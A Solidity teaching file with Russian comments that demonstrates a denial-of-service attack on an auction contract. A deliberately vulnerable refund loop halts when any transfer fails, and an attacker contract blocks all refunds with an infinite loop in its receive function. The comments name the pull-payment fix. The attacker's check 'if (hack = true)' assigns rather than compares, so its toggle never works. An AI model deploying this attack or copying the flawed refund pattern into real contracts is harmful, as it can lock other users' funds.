// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

contract DosAuction {
    
    mapping(address => uint) public bidders;
    address[] public allBidders;

    // Для отслеживания кому мы выдали деньги, а кому нет
    uint public refundProgress;

    function bid() external payable {
        // Можно запретить делать ставки со смарт-контрактов
        // require(msg.sender.code.length == 0, "Daps: its a smart-contract!");
        // Но это не 100% защита
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }
    // Подход "push-pull"
    // Функция, которая вернет всем денежные средства без запроса
    // Как защититься? От этой атаки
    // Можно использовать подход pull
    function refund() external {
        for (uint i = refundProgress; i < allBidders.length; i++) {
            address bidder = allBidders[i];

            (bool success, ) = bidder.call{value: bidders[bidder]}("");

            // Если success = 0, то мы выходим из функции
            require(success, "Daps: failed!");
            // Правильно использовать вместо require()
            // if (!success) {
            //     failedRefunds.push(bidder);
            //     // А потом вручную смотрим, кому не удалось выдать средства
            // }

            refundProgress++;
        }
    }
}

contract DosAttack {
    DosAuction _auction;

    bool hack = true;
    address payable owner;
    constructor(address auction) {
        _auction = DosAuction(auction);
        owner = payable(msg.sender);
    }

    // Делаем ставку от смарт-контракта
    function doBid() external payable {
        _auction.bid{value: msg.value}();
    }

    function toggleHack() external {
        require(msg.sender == owner, "Daps: u are not a hacker");

        hack = !hack;
    }
    // Этот вызов стопарит функцию refund 
    receive() external payable {
        if (hack = true) {
            while(true) {}
        } else {

        }
    }
}